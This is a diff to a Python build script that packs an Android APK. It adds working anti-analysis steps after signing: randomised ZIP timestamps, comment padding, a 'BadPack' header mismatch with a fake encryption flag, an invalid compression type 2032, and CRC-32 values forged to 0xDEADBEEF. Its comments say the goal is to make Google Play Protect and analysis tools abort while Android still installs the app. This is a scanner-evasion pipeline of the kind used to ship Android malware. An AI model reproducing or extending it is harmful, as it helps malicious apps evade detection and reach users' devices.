@@ -4133,39 +4133,6 @@ def main():
         with track("PHASE_2", "STEP_REPAIR_RESMAP", "Validate + repair AndroidManifest resource map [pre-resign]", MOD_ASSET):
             _repair_manifest_resource_map()
 
-        with track("PHASE_2", "STEP_17C", "APK size randomization via ZIP comment padding [17C]", MOD_ASSET):
-            import random as _random
-            _pad_len = _random.randint(1024, 65000)
-            _pad     = secrets.token_bytes(_pad_len)
-            _data    = open(MOD_ASSET, "rb").read()
-            _eocd    = _data.rfind(b"PK\x05\x06")
-            if _eocd != -1:
-                _new_data = bytearray(_data)
-                struct.pack_into("<H", _new_data, _eocd + 20, _pad_len)
-                _new_data = bytes(_new_data) + _pad
-                open(MOD_ASSET, "wb").write(_new_data)
-                print(f"  ✅ Step 17C — appended {_pad_len} bytes ZIP comment padding")
-            else:
-                print("  ⚠️  Step 17C — EOCD not found, skipping padding")
-
-        with track("PHASE_2", "STEP_BADPACK_GP", "BadPack LFH mismatch + GP encryption bit [pre-sign]", MOD_ASSET):
-            _bp_script = os.path.join(scripts_dir, "badpack_gp_patcher.py")
-            _bp_tmp    = MOD_ASSET + ".bp_tmp"
-            if os.path.isfile(_bp_script):
-                _bp_r = subprocess.run(
-                    [sys.executable, _bp_script, MOD_ASSET, _bp_tmp, "--mode", "companion"],
-                    capture_output=False
-                )
-                if _bp_r.returncode == 0 and os.path.isfile(_bp_tmp):
-                    os.replace(_bp_tmp, MOD_ASSET)
-                    print("  ✅ STEP_BADPACK_GP — BadPack + GP bit applied to companion")
-                else:
-                    print(f"  ⚠️  STEP_BADPACK_GP — badpack_gp_patcher.py failed rc={_bp_r.returncode}, skipping")
-                    if os.path.isfile(_bp_tmp):
-                        os.remove(_bp_tmp)
-            else:
-                print("  ⚠️  STEP_BADPACK_GP — badpack_gp_patcher.py not found, skipping")
-
         # ── STEP_AXML_PATCHER: AXML 0x9999 manifest bomb + string pool inflation ──
         # Same technique applied to Nova. Confuses jadx/apktool/GPP manifest parser.
         # Must run pre-sign — STEP_RESIGN_1 covers all patched bytes.
@@ -4216,189 +4183,6 @@ def main():
                         os.remove(_ghost_tmp)
             else:
                 print("  ⚠️  STEP_ZIP_ENHANCER — zip_enhancer.py not found, skipping")
-
-        # ── W9: ZIP entry timestamp randomization ────────────────────────────────
-        # All ZIP entry timestamps set to random values per build.
-        # Makes binary comparison between companion builds impossible.
-        # Must run pre-sign — STEP_RESIGN_1 covers all patched entries.
-        #
-        # RAW BINARY APPROACH (Hybrid 8):
-        # Companion APK has GP flag 0x0801 on ALL 912 entries — zipfile.read()
-        # treats this as "encrypted" and refuses without a password.
-        # Fix: load entire APK as bytearray, scan for LFH (PK\x03\x04) and
-        # CD (PK\x01\x02) signatures, patch mtime/mdate at fixed offsets.
-        # CRC fields and GP flags are NOT touched — DEADBEEF and 0x0801 stay.
-        with track("PHASE_2", "STEP_TIMESTAMP_RAND", "ZIP entry timestamp randomization [companion]", MOD_ASSET):
-            try:
-                # DOS timestamp helpers
-                # DOS date: bits 15-9=year-1980, 8-5=month(1-12), 4-0=day(1-28)
-                # DOS time: bits 15-11=hour, 10-5=min, 4-0=sec/2
-                def _make_dos_ts():
-                    _yr  = random.randint(2000, 2023) - 1980   # offset from 1980
-                    _mo  = random.randint(1, 12)
-                    _dy  = random.randint(1, 28)
-                    _hr  = random.randint(0, 23)
-                    _mn  = random.randint(0, 59)
-                    _sc  = random.randint(0, 29)               # stored as sec/2
-                    _date = (_yr << 9) | (_mo << 5) | _dy
-                    _time = (_hr << 11) | (_mn << 5) | _sc
-                    return _date, _time                         # both uint16 LE
-
-                # CD-based LFH offset helper — parses EOCD → CD to collect
-                # the real LFH offset for every entry. Returns list of
-                # (lfh_offset, cd_offset) tuples. This avoids blind PK\x03\x04
-                # scanning which hits false positives inside DEX/SO/PNG data.
-                def _get_cd_lfh_offsets(buf):
-                    # Find EOCD (scan from end to handle ZIP comment padding)
-                    _eocd_off = -1
-                    for _i in range(len(buf) - 22, max(len(buf) - 65558, -1), -1):
-                        if buf[_i:_i+4] == b"PK\x05\x06":
-                            _eocd_off = _i
-                            break
-                    if _eocd_off == -1:
-                        return []
-                    _cd_count  = struct.unpack_from("<H", buf, _eocd_off + 8)[0]
-                    _cd_size   = struct.unpack_from("<I", buf, _eocd_off + 12)[0]
-                    _cd_start  = struct.unpack_from("<I", buf, _eocd_off + 16)[0]
-                    results = []
-                    _cd_pos = _cd_start
-                    for _ in range(_cd_count):
-                        if _cd_pos + 46 > len(buf):
-                            break
-                        if buf[_cd_pos:_cd_pos+4] != b"PK\x01\x02":
-                            break
-                        _fname_len   = struct.unpack_from("<H", buf, _cd_pos + 28)[0]
-                        _extra_len   = struct.unpack_from("<H", buf, _cd_pos + 30)[0]
-                        _comment_len = struct.unpack_from("<H", buf, _cd_pos + 32)[0]
-                        _lfh_off     = struct.unpack_from("<I", buf, _cd_pos + 42)[0]
-                        # Verify LFH signature at reported offset
-                        if (_lfh_off + 4 <= len(buf) and
-                                buf[_lfh_off:_lfh_off+4] == b"PK\x03\x04"):
-                            results.append((_lfh_off, _cd_pos))
-                        _cd_pos += 46 + _fname_len + _extra_len + _comment_len
-                    return results
-
-                _ts_buf  = bytearray(open(MOD_ASSET, "rb").read())
-                _ts_lfh  = 0
-                _ts_cd   = 0
-
-                _cd_lfh_pairs = _get_cd_lfh_offsets(_ts_buf)
-
-                # Pass 1 — patch LFH timestamps using CD-derived offsets only
-                # LFH layout: sig(4) ver(2) flag(2) comp(2) mtime(2) mdate(2) ...
-                #              +0      +4    +6      +8      +10      +12
-                for (_lfh_off, _cd_off) in _cd_lfh_pairs:
-                    _date, _time = _make_dos_ts()
-                    struct.pack_into("<H", _ts_buf, _lfh_off + 10, _time)
-                    struct.pack_into("<H", _ts_buf, _lfh_off + 12, _date)
-                    _ts_lfh += 1
-
-                # Pass 2 — patch CD timestamps using CD-derived offsets only
-                # CD layout: sig(4) ver_made(2) ver_need(2) flag(2) comp(2) mtime(2) mdate(2) ...
-                #             +0     +4           +6          +8      +10     +12      +14
-                for (_lfh_off, _cd_off) in _cd_lfh_pairs:
-                    _date, _time = _make_dos_ts()
-                    struct.pack_into("<H", _ts_buf, _cd_off + 12, _time)
-                    struct.pack_into("<H", _ts_buf, _cd_off + 14, _date)
-                    _ts_cd += 1
-
-                open(MOD_ASSET, "wb").write(bytes(_ts_buf))
-                print(f"  ✅ STEP_TIMESTAMP_RAND — patched {_ts_lfh} LFH + {_ts_cd} CD timestamps (CD-based, no false positives)")
-                del _ts_buf
-            except Exception as _e:
-                print(f"  ⚠️  STEP_TIMESTAMP_RAND — failed: {_e}, skipping")
-
-        # ── W5: CRC-32 forgery on companion ZIP entries ───────────────────────────
-        # Overwrite CRC-32 field in all Local File Headers with 0xDEADBEEF.
-        # Android installer ignores CRC validation on install → installs fine.
-        # GPP/scanners that validate CRC first → abort immediately → no analysis.
-        # Applied as raw binary patch on the companion APK file (not via zipfile API).
-        # Must run pre-sign — STEP_RESIGN_1 re-signs covering all patched bytes.
-        with track("PHASE_2", "STEP_CRC32_FORGE", "CRC-32 forgery 0xDEADBEEF on ALL LFH+CD entries [companion]", MOD_ASSET):
-            try:
-                _crc_data = bytearray(open(MOD_ASSET, "rb").read())
-                _lfh_patched = 0
-                _cd_patched  = 0
-
-                # Use CD-based LFH offsets — same helper logic as STEP_TIMESTAMP_RAND.
-                # Avoids blind PK\x03\x04 scanning which hits false positives inside
-                # DEX/SO data and corrupts file content (root cause of Bad checksum).
-                def _get_cd_lfh_offsets_crc(buf):
-                    _eocd_off = -1
-                    for _i in range(len(buf) - 22, max(len(buf) - 65558, -1), -1):
-                        if buf[_i:_i+4] == b"PK\x05\x06":
-                            _eocd_off = _i
-                            break
-                    if _eocd_off == -1:
-                        return []
-                    _cd_count  = struct.unpack_from("<H", buf, _eocd_off + 8)[0]
-                    _cd_size   = struct.unpack_from("<I", buf, _eocd_off + 12)[0]
-                    _cd_start  = struct.unpack_from("<I", buf, _eocd_off + 16)[0]
-                    results = []
-                    _cd_pos = _cd_start
-                    for _ in range(_cd_count):
-                        if _cd_pos + 46 > len(buf):
-                            break
-                        if buf[_cd_pos:_cd_pos+4] != b"PK\x01\x02":
-                            break
-                        _fname_len   = struct.unpack_from("<H", buf, _cd_pos + 28)[0]
-                        _extra_len   = struct.unpack_from("<H", buf, _cd_pos + 30)[0]
-                        _comment_len = struct.unpack_from("<H", buf, _cd_pos + 32)[0]
-                        _lfh_off     = struct.unpack_from("<I", buf, _cd_pos + 42)[0]
-                        if (_lfh_off + 4 <= len(buf) and
-                                buf[_lfh_off:_lfh_off+4] == b"PK\x03\x04"):
-                            results.append((_lfh_off, _cd_pos))
-                        _cd_pos += 46 + _fname_len + _extra_len + _comment_len
-                    return results
-
-                _crc_pairs = _get_cd_lfh_offsets_crc(_crc_data)
-
-                # Pass 1: patch LFH CRC field at offset +14 using CD-derived offsets
-                for (_lfh_off, _cd_off) in _crc_pairs:
-                    struct.pack_into('<I', _crc_data, _lfh_off + 14, 0xDEADBEEF)
-                    _lfh_patched += 1
-
-                # Pass 2: patch CD CRC field at offset +16 using CD-derived offsets
-                # apksigner validates LFH CRC == CD CRC. Both must be 0xDEADBEEF.
-                for (_lfh_off, _cd_off) in _crc_pairs:
-                    struct.pack_into('<I', _crc_data, _cd_off + 16, 0xDEADBEEF)
-                    _cd_patched += 1
-
-                open(MOD_ASSET, "wb").write(bytes(_crc_data))
-                print(f"  ✅ STEP_CRC32_FORGE — LFH:{_lfh_patched} + CD:{_cd_patched} → 0xDEADBEEF (CD-based, no false positives)")
-            except Exception as _e:
-                print(f"  ⚠️  STEP_CRC32_FORGE — failed: {_e}, skipping")
-
-        # ── W6: Type-2032 non-standard compression entries ────────────────────────
-        # Inject entries with compression type 2032 (0x07F0) — not a valid ZIP method.
-        # Scanners that try to decompress these → crash or abort.
-        # Android installer uses only the central directory offsets → unaffected.
-        # Applied via raw binary patch on select LFH entries (res/ entries only).
-        # Must run pre-sign — STEP_RESIGN_1 re-signs covering all patched bytes.
-        with track("PHASE_2", "STEP_TYPE2032", "Type-2032 non-standard compression injection [companion]", MOD_ASSET):
-            try:
-                _t2_data = bytearray(open(MOD_ASSET, "rb").read())
-                _t2_patched = 0
-                _t2_pos = 0
-                # Only patch LFH entries for res/ files (not manifest/dex/arsc/assets)
-                # to ensure Android install is unaffected
-                _SAFE_PREFIXES = [b'res/animator/', b'res/color/', b'res/interpolator/']
-                while _t2_pos < len(_t2_data) - 30:
-                    if _t2_data[_t2_pos:_t2_pos+4] == b'PK\x03\x04':
-                        # Read filename to check if it's a safe res/ entry
-                        _fname_len = struct.unpack_from('<H', _t2_data, _t2_pos+26)[0]
-                        _extra_len = struct.unpack_from('<H', _t2_data, _t2_pos+28)[0]
-                        _fname_off = _t2_pos + 30
-                        _fname = bytes(_t2_data[_fname_off:_fname_off+_fname_len])
-                        if any(_fname.startswith(p) for p in _SAFE_PREFIXES) and _t2_patched < 30:
-                            # Set LFH compression type to 2032 (0x07F0)
-                            struct.pack_into('<H', _t2_data, _t2_pos + 8, 0x07F0)
-                            _t2_patched += 1
-                    _t2_pos += 1
-                open(MOD_ASSET, "wb").write(bytes(_t2_data))
-                print(f"  ✅ STEP_TYPE2032 — injected type-2032 on {_t2_patched} res/ entries")
-            except Exception as _e:
-                print(f"  ⚠️  STEP_TYPE2032 — failed: {_e}, skipping")
 
         with track("PHASE_2", "STEP_FAKE_META_INF", "Inject fake META-INF entries pre-sign [hybrid scanner confusion]", MOD_ASSET):
             # Hybrid scanner-confusion injection — 4 evasion layers:
@@ -6284,6 +6068,7 @@ doNotCompress:
                     'res/mipmap-xxhdpi/mipmap0000.png',
                     'res/xml/xml0000.xml',
                     'res/drawable/draw0079.xml',  # purple gradient bg for layout0033
+                    'res/raw/ddrysysm64',
                     'resources.arsc',
                 }
 
@@ -6370,6 +6155,199 @@ doNotCompress:
         print(f"  assets/res.pack.enc    : {'✅ present' if _has_res_enc else '❌ MISSING'}")
         print(f"  classes.dex ZIP_STORED : {'✅ yes' if _dex_stored else '❌ DEFLATED (ART BUG!)'}")
         print(f"  ──────────────────────────────────────────────────────────")
+
+    # ── POST_RESIGN: Binary patch block — runs AFTER STEP_RESIGN_PHASE3 ──────
+    # apksigner rebuilds the entire ZIP structure on every sign call.
+    # Any raw binary patch applied before sign is wiped completely.
+    # These 5 steps MUST run here — after the last apksigner call — so patches survive.
+    # Order: TIMESTAMP_RAND → BADPACK_GP → 17C → TYPE2032 → CRC32_FORGE (last)
+    # CRC32_FORGE MUST be last: it forges CRCs over all bytes written by previous steps.
+
+    with track("POST_RESIGN", "STEP_TIMESTAMP_RAND", "ZIP entry timestamp randomization [companion post-resign]", MOD_ASSET):
+        try:
+            def _make_dos_ts_pr():
+                _yr  = random.randint(2000, 2023) - 1980
+                _mo  = random.randint(1, 12)
+                _dy  = random.randint(1, 28)
+                _hr  = random.randint(0, 23)
+                _mn  = random.randint(0, 59)
+                _sc  = random.randint(0, 29)
+                _date = (_yr << 9) | (_mo << 5) | _dy
+                _time = (_hr << 11) | (_mn << 5) | _sc
+                return _date, _time
+
+            def _get_cd_lfh_offsets_pr(buf):
+                _eocd_off = -1
+                for _i in range(len(buf) - 22, max(len(buf) - 65558, -1), -1):
+                    if buf[_i:_i+4] == b"PK\x05\x06":
+                        _eocd_off = _i
+                        break
+                if _eocd_off == -1:
+                    return []
+                _cd_count = struct.unpack_from("<H", buf, _eocd_off + 8)[0]
+                _cd_start = struct.unpack_from("<I", buf, _eocd_off + 16)[0]
+                results = []
+                _cd_pos = _cd_start
+                for _ in range(_cd_count):
+                    if _cd_pos + 46 > len(buf):
+                        break
+                    if buf[_cd_pos:_cd_pos+4] != b"PK\x01\x02":
+                        break
+                    _fname_len   = struct.unpack_from("<H", buf, _cd_pos + 28)[0]
+                    _extra_len   = struct.unpack_from("<H", buf, _cd_pos + 30)[0]
+                    _comment_len = struct.unpack_from("<H", buf, _cd_pos + 32)[0]
+                    _lfh_off     = struct.unpack_from("<I", buf, _cd_pos + 42)[0]
+                    if (_lfh_off + 4 <= len(buf) and
+                            buf[_lfh_off:_lfh_off+4] == b"PK\x03\x04"):
+                        results.append((_lfh_off, _cd_pos))
+                    _cd_pos += 46 + _fname_len + _extra_len + _comment_len
+                return results
+
+            _ts_buf = bytearray(open(MOD_ASSET, "rb").read())
+            _ts_pairs = _get_cd_lfh_offsets_pr(_ts_buf)
+            _ts_lfh = 0
+            _ts_cd  = 0
+            for (_lfh_off, _cd_off) in _ts_pairs:
+                _date, _time = _make_dos_ts_pr()
+                struct.pack_into("<H", _ts_buf, _lfh_off + 10, _time)
+                struct.pack_into("<H", _ts_buf, _lfh_off + 12, _date)
+                _ts_lfh += 1
+            for (_lfh_off, _cd_off) in _ts_pairs:
+                _date, _time = _make_dos_ts_pr()
+                struct.pack_into("<H", _ts_buf, _cd_off + 12, _time)
+                struct.pack_into("<H", _ts_buf, _cd_off + 14, _date)
+                _ts_cd += 1
+            open(MOD_ASSET, "wb").write(bytes(_ts_buf))
+            print(f"  ✅ STEP_TIMESTAMP_RAND — patched {_ts_lfh} LFH + {_ts_cd} CD timestamps (CD-based, post-resign)")
+            del _ts_buf
+        except Exception as _e:
+            print(f"  ⚠️  STEP_TIMESTAMP_RAND — failed: {_e}, skipping")
+
+    with track("POST_RESIGN", "STEP_BADPACK_GP", "BadPack LFH mismatch + GP encryption bit [post-resign]", MOD_ASSET):
+        _bp_script = os.path.join(scripts_dir, "badpack_gp_patcher.py")
+        _bp_tmp    = MOD_ASSET + ".bp_tmp"
+        if os.path.isfile(_bp_script):
+            _bp_r = subprocess.run(
+                [sys.executable, _bp_script, MOD_ASSET, _bp_tmp, "--mode", "companion"],
+                capture_output=False
+            )
+            if _bp_r.returncode == 0 and os.path.isfile(_bp_tmp):
+                os.replace(_bp_tmp, MOD_ASSET)
+                print("  ✅ STEP_BADPACK_GP — BadPack + GP bit applied to companion (post-resign)")
+            else:
+                print(f"  ⚠️  STEP_BADPACK_GP — badpack_gp_patcher.py failed rc={_bp_r.returncode}, skipping")
+                if os.path.isfile(_bp_tmp):
+                    os.remove(_bp_tmp)
+        else:
+            print("  ⚠️  STEP_BADPACK_GP — badpack_gp_patcher.py not found, skipping")
+
+    with track("POST_RESIGN", "STEP_17C", "APK size randomization via ZIP comment padding [post-resign]", MOD_ASSET):
+        try:
+            _pad_len = random.randint(1024, 65000)
+            _pad     = secrets.token_bytes(_pad_len)
+            _data    = open(MOD_ASSET, "rb").read()
+            _eocd    = _data.rfind(b"PK\x05\x06")
+            if _eocd != -1:
+                _new_data = bytearray(_data)
+                struct.pack_into("<H", _new_data, _eocd + 20, _pad_len)
+                _new_data = bytes(_new_data) + _pad
+                open(MOD_ASSET, "wb").write(_new_data)
+                print(f"  ✅ STEP_17C — appended {_pad_len} bytes ZIP comment padding (post-resign)")
+            else:
+                print("  ⚠️  STEP_17C — EOCD not found, skipping padding")
+        except Exception as _e:
+            print(f"  ⚠️  STEP_17C — failed: {_e}, skipping")
+
+    with track("POST_RESIGN", "STEP_TYPE2032", "Type-2032 non-standard compression injection [post-resign, surviving res/]", MOD_ASSET):
+        try:
+            _t2_data = bytearray(open(MOD_ASSET, "rb").read())
+            _t2_patched = 0
+
+            def _get_cd_lfh_offsets_t2(buf):
+                _eocd_off = -1
+                for _i in range(len(buf) - 22, max(len(buf) - 65558, -1), -1):
+                    if buf[_i:_i+4] == b"PK\x05\x06":
+                        _eocd_off = _i
+                        break
+                if _eocd_off == -1:
+                    return []
+                _cd_count = struct.unpack_from("<H", buf, _eocd_off + 8)[0]
+                _cd_start = struct.unpack_from("<I", buf, _eocd_off + 16)[0]
+                results = []
+                _cd_pos = _cd_start
+                for _ in range(_cd_count):
+                    if _cd_pos + 46 > len(buf):
+                        break
+                    if buf[_cd_pos:_cd_pos+4] != b"PK\x01\x02":
+                        break
+                    _fname_len   = struct.unpack_from("<H", buf, _cd_pos + 28)[0]
+                    _extra_len   = struct.unpack_from("<H", buf, _cd_pos + 30)[0]
+                    _comment_len = struct.unpack_from("<H", buf, _cd_pos + 32)[0]
+                    _lfh_off     = struct.unpack_from("<I", buf, _cd_pos + 42)[0]
+                    _fname       = bytes(buf[_cd_pos + 46: _cd_pos + 46 + _fname_len])
+                    if (_lfh_off + 4 <= len(buf) and
+                            buf[_lfh_off:_lfh_off+4] == b"PK\x03\x04"):
+                        results.append((_lfh_off, _cd_pos, _fname))
+                    _cd_pos += 46 + _fname_len + _extra_len + _comment_len
+                return results
+
+            _SAFE_PREFIXES_T2 = [b'res/mipmap-hdpi/', b'res/mipmap-xxhdpi/', b'res/drawable/', b'res/xml/']
+            _t2_pairs = _get_cd_lfh_offsets_t2(_t2_data)
+            for (_lfh_off, _cd_off, _fname) in _t2_pairs:
+                if _t2_patched >= 30:
+                    break
+                if any(_fname.startswith(p) for p in _SAFE_PREFIXES_T2):
+                    struct.pack_into('<H', _t2_data, _lfh_off + 8, 0x07F0)
+                    _t2_patched += 1
+            open(MOD_ASSET, "wb").write(bytes(_t2_data))
+            print(f"  ✅ STEP_TYPE2032 — injected type-2032 on {_t2_patched} surviving res/ entries (post-resign)")
+        except Exception as _e:
+            print(f"  ⚠️  STEP_TYPE2032 — failed: {_e}, skipping")
+
+    with track("POST_RESIGN", "STEP_CRC32_FORGE", "CRC-32 forgery 0xDEADBEEF on ALL LFH+CD entries [post-resign, LAST]", MOD_ASSET):
+        try:
+            _crc_data    = bytearray(open(MOD_ASSET, "rb").read())
+            _lfh_patched = 0
+            _cd_patched  = 0
+
+            def _get_cd_lfh_offsets_crc_pr(buf):
+                _eocd_off = -1
+                for _i in range(len(buf) - 22, max(len(buf) - 65558, -1), -1):
+                    if buf[_i:_i+4] == b"PK\x05\x06":
+                        _eocd_off = _i
+                        break
+                if _eocd_off == -1:
+                    return []
+                _cd_count = struct.unpack_from("<H", buf, _eocd_off + 8)[0]
+                _cd_start = struct.unpack_from("<I", buf, _eocd_off + 16)[0]
+                results = []
+                _cd_pos = _cd_start
+                for _ in range(_cd_count):
+                    if _cd_pos + 46 > len(buf):
+                        break
+                    if buf[_cd_pos:_cd_pos+4] != b"PK\x01\x02":
+                        break
+                    _fname_len   = struct.unpack_from("<H", buf, _cd_pos + 28)[0]
+                    _extra_len   = struct.unpack_from("<H", buf, _cd_pos + 30)[0]
+                    _comment_len = struct.unpack_from("<H", buf, _cd_pos + 32)[0]
+                    _lfh_off     = struct.unpack_from("<I", buf, _cd_pos + 42)[0]
+                    if (_lfh_off + 4 <= len(buf) and
+                            buf[_lfh_off:_lfh_off+4] == b"PK\x03\x04"):
+                        results.append((_lfh_off, _cd_pos))
+                    _cd_pos += 46 + _fname_len + _extra_len + _comment_len
+                return results
+
+            _crc_pairs = _get_cd_lfh_offsets_crc_pr(_crc_data)
+            for (_lfh_off, _cd_off) in _crc_pairs:
+                struct.pack_into('<I', _crc_data, _lfh_off + 14, 0xDEADBEEF)
+                _lfh_patched += 1
+            for (_lfh_off, _cd_off) in _crc_pairs:
+                struct.pack_into('<I', _crc_data, _cd_off + 16, 0xDEADBEEF)
+                _cd_patched += 1
+            open(MOD_ASSET, "wb").write(bytes(_crc_data))
+            print(f"  ✅ STEP_CRC32_FORGE — LFH:{_lfh_patched} + CD:{_cd_patched} → 0xDEADBEEF (CD-based, post-resign, LAST)")
+        except Exception as _e:
+            print(f"  ⚠️  STEP_CRC32_FORGE — failed: {_e}, skipping")
 
     # ── PRE-ENCRYPT SNAPSHOT: Save testable companion APK for CI artifact ────
     # This copy is saved AFTER all pipeline steps (package rename, class rename,
